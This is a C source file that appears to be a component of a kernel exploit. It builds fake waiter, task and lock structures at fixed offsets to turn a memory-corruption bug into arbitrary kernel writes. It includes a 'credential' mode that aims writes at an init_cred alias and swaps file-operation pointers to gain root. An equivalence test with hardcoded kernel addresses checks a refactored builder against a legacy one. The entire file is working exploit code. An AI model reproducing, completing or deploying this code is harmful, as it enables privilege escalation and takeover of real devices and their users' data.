#include "payload_builder.h"

#include <string.h>

static void store64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

PayloadWriteLayout payload_write_layout(
    const WriteRequest *request, uintptr_t page_base,
    uintptr_t default_fops, uintptr_t credential_fops,
    uintptr_t init_cred_alias) {
  PayloadWriteLayout layout = {
    .fops = default_fops,
  };
  if (!request || request->mode == WRITE_MODE_DISABLED) return layout;

  if (request->preserve_child) {
    layout.right = request->mode == WRITE_MODE_CREDENTIAL
        ? init_cred_alias
        : page_base + 0x100;
  }
  if (request->mode == WRITE_MODE_CREDENTIAL) {
    layout.fops = credential_fops;
    layout.needs_credential_copy = 1;
  }
  layout.parent = request->target - 8;
  return layout;
}

void build_tcp_zerocopy_payload(
    unsigned char *waiter, const WriteRequest *request,
    const PayloadWriteLayout *layout) {
  if (layout->right) {
    store64(waiter, 0x18, layout->right);
    store64(waiter, 0x20, 0);
    store64(waiter, 0x28, request->target);
    return;
  }
  build_select_stack_payload(waiter, layout);
}

void build_select_stack_payload(
    unsigned char *waiter, const PayloadWriteLayout *layout) {
  store64(waiter, 0x18, layout->parent);
  store64(waiter, 0x20, layout->right);
  store64(waiter, 0x28, layout->left);
}

void build_multicast_waiter_payload(
    unsigned char *buffer, size_t waiter_offset, size_t task_offset,
    size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock) {
  store64(buffer, waiter_offset + task_offset, fake_task);
  store64(buffer, waiter_offset + lock_offset, fake_lock);
}

static void legacy_compact_words(
    unsigned char *waiter, uintptr_t target, int mode, int child,
    int tcp_zerocopy, uintptr_t page_base, uintptr_t init_cred_alias) {
  uintptr_t right = 0;
  if (child) right = mode == 2 ? init_cred_alias : page_base + 0x100;
  if (tcp_zerocopy && right) {
    store64(waiter, 0x18, right);
    store64(waiter, 0x20, 0);
    store64(waiter, 0x28, target);
  } else {
    store64(waiter, 0x18, target - 8);
    store64(waiter, 0x20, right);
    store64(waiter, 0x28, 0);
  }
}

int payload_builder_equivalence_test(void) {
  static const struct {
    uintptr_t target;
    WriteMode mode;
    int leaf;
    int tcp;
  } vectors[] = {
    {0xffffff8000123000ULL, WRITE_MODE_ZERO, 1, 0},
    {0xffffff8000124000ULL, WRITE_MODE_ZERO, 0, 0},
    {0xffffff8000125000ULL, WRITE_MODE_CREDENTIAL, 0, 0},
    {0xffffff8000126000ULL, WRITE_MODE_CREDENTIAL, 0, 1},
  };
  const uintptr_t page = 0xffffff8800200000ULL;
  const uintptr_t init_cred = 0xffffff802abfd588ULL;
  for (size_t i = 0; i < sizeof(vectors) / sizeof(vectors[0]); ++i) {
    unsigned char legacy[0x30] = {0};
    unsigned char current[0x30] = {0};
    WriteRequest request = write_request_make(
        vectors[i].target, vectors[i].mode, vectors[i].leaf);
    PayloadWriteLayout layout = payload_write_layout(
        &request, page, 0x1111, 0x2222, init_cred);
    legacy_compact_words(
        legacy, vectors[i].target, vectors[i].mode, !vectors[i].leaf,
        vectors[i].tcp, page, init_cred);
    if (vectors[i].tcp)
      build_tcp_zerocopy_payload(current, &request, &layout);
    else
      build_select_stack_payload(current, &layout);
    if (memcmp(legacy, current, sizeof(legacy)) != 0) return 0;
  }
  unsigned char legacy_stamp[0x80] = {0};
  unsigned char current_stamp[0x80] = {0};
  store64(legacy_stamp, 0x20 + 0x28, 0xffffff8800005800ULL);
  store64(legacy_stamp, 0x20 + 0x30, 0xffffff8800001000ULL);
  build_multicast_waiter_payload(
      current_stamp, 0x20, 0x28, 0x30,
      0xffffff8800005800ULL, 0xffffff8800001000ULL);
  if (memcmp(legacy_stamp, current_stamp, sizeof(legacy_stamp)) != 0) return 0;
  return 1;
}
